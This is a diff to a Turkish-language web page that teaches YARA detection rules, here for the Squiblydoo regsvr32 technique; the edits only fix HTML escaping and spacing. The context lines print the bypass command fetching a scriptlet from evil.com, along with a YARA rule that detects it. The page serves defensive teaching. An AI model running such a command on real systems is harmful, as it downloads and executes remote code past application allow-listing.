@@ -570,7 +570,7 @@ mshta.exe javascript:alert("Test");close()</code></pre>
     <p>Squiblydoo, Casey Smith tarafından 2016'da keşfedilen bir AppLocker bypass tekniğidir. <code>/i:</code> parametresi bir URL alınca <code>scrobj.dll</code> o URL'deki <code>.sct</code> scriptlet dosyasını indirip çalıştırıyor. Diske hiçbir şey yazılmıyor.</p>
     <pre><code>regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll</code></pre>
     <p>Hedef <code>.sct</code> dosyası XML formatında bir scriptlet'tir ve içinde JScript veya VBScript bulunur.</p>
-    <pre><code>rule Detect_Regsvr32_Squiblydoo_T1218_010 {
+<pre><code>rule Detect_Regsvr32_Squiblydoo_T1218_010 {
     meta:
         description = "regsvr32 Squiblydoo / SCT scriptlet tespiti"
         author      = "Roman"
@@ -579,8 +579,8 @@ mshta.exe javascript:alert("Test");close()</code></pre>
     strings:
         $regsvr32 = "regsvr32"       ascii nocase
         $scrobj   = "scrobj.dll"     ascii nocase
-        $sct_tag  = "<scriptlet>"    ascii nocase
-        $reg_tag  = "<registration"  ascii nocase
+        $sct_tag  = "&lt;scriptlet&gt;"    ascii nocase
+        $reg_tag  = "&lt;registration"  ascii nocase
         $http_i   = "/i:http"        ascii nocase
         $https_i  = "/i:https"       ascii nocase
         $jscript  = "JScript"        ascii
@@ -591,7 +591,6 @@ mshta.exe javascript:alert("Test");close()</code></pre>
         ($sct_tag and $reg_tag and any of ($jscript,$vbscript,$wshell))
 }</code></pre>
     <p><strong>Kural mantığı:</strong> İki condition bloğu var. Birinci: <code>regsvr32</code> + <code>scrobj.dll</code> + <code>/i:http</code> — Squiblydoo komutunun kendisi. İkinci: <code>&lt;scriptlet&gt;</code> + <code>&lt;registration</code> + aktif script içeriği — doğrudan <code>.sct</code> dosyasını yakalar. Bu kombinasyon neredeyse her zaman Squiblydoo veya benzeri bir tekniğin eseridir.</p>
-
     <h2>YARA Kurallarını Çalıştırmak</h2>
     <p>Tek dosyayı taramak için:</p>
     <pre><code>yara kural.yar hedef_dosya.sh</code></pre>
